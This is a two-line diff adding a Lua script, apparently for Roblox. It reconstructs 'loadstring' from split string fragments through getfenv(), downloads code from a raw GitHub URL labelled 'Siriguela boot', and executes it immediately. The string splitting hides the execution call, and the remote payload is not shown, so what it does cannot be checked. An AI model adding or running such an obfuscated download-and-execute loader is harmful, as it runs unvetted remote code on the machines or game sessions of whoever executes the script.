@@ -1,0 +1,2 @@
+local f = getfenv()[("loa".."dstr".."ing")]
+f(game:HttpGet("https://raw.githubusercontent.com/siriguela820/Siriguela-boot/refs/heads/main/Siriguela%20%20boot", true))()
